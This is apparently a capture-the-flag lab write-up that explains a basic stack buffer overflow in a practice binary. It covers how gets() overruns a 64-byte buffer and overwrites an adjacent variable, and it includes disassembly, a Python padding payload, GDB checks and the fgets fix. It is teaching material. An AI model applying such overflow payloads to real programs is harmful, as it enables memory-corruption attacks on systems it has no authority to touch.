# ex00 — Stack Overflow into a Variable

## Goal

Change the `modified` variable from `0` to a non-zero value to make the program print:

```
you have changed the 'modified' variable
```

## Concept

This is the simplest form of a **stack buffer overflow**. The program:

1. Allocates a 64-byte buffer on the stack.
2. Reads input into it using `gets()`, which has **no bounds checking**.
3. Checks if a separate variable (`modified`, initially 0) has been changed.

Because `gets()` does not limit how many bytes it reads, writing past the end of the buffer overwrites adjacent stack memory — in this case, the `modified` variable.

### Why `gets()` is dangerous

`gets()` reads from stdin until a newline or EOF, with no regard for the size of the destination buffer. It was officially removed from the C11 standard for this reason.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  modified (4 bytes)         │  [esp+0x5c]  ← target variable
├─────────────────────────────┤
│  ... (padding / unused)     │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [esp+0x1c]  ← gets() writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

The buffer starts at `[esp+0x1c]` and `modified` is at `[esp+0x5c]`. The offset is `0x5c - 0x1c = 0x40 = 64` bytes.

## Relevant Assembly (`main`)

```asm
080483f4 <main>:
    push   ebp
    mov    ebp, esp
    and    esp, 0xfffffff0        ; align stack to 16 bytes
    sub    esp, 0x60              ; allocate 96 bytes of stack space

    mov    DWORD PTR [esp+0x5c], 0x0   ; modified = 0

    lea    eax, [esp+0x1c]             ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax        ; arg1 = buffer
    call   gets                        ; gets(buffer) — NO BOUNDS CHECK

    mov    eax, DWORD PTR [esp+0x5c]   ; eax = modified
    test   eax, eax                    ; if (modified == 0)
    je     0x08048427                  ;   skip success message

    mov    DWORD PTR [esp], 0x8048500  ; "you have changed the 'modified' variable"
    call   puts                        ; print it
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `sub esp, 0x60` | Allocates 96 bytes for local variables |
| `mov [esp+0x5c], 0x0` | Sets `modified = 0` |
| `lea eax, [esp+0x1c]` | Gets address of the buffer start |
| `call gets` | Reads unlimited input into the buffer |
| `test eax, eax` | Checks if `modified` is still 0 |

## Exploit

Send 64 bytes of padding to fill the buffer, then 1+ non-zero bytes to overwrite `modified`:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B" + b"\n")' | ./bin
```

### Why it works

- Bytes 1–64: Fill the buffer at `[esp+0x1c]` through `[esp+0x5b]`
- Byte 65 (`"B"` = 0x42): Overwrites the first byte of `modified` at `[esp+0x5c]`
- `modified` is now `0x00000042` (non-zero)
- The `test eax, eax` check passes, and the success message prints

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after gets() returns
break *0x08048411
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B" + b"\n")')

# Examine the modified variable
x/4xb $esp+0x5c
# Output: 0x42  0x00  0x00  0x00  (little-endian, non-zero!)

# Examine the buffer
x/16xb $esp+0x1c
# Output: 0x41  0x41  0x41  0x41 ... (all 'A's)

# Check the value as an integer
x/wx $esp+0x5c
# Output: 0x00000042

# Continue to see the success message
continue
```

## Key Takeaway

`gets()` is never safe. Any buffer read with `gets()` can be overflowed. The fix is to use `fgets(buffer, size, stdin)` which respects a maximum length.
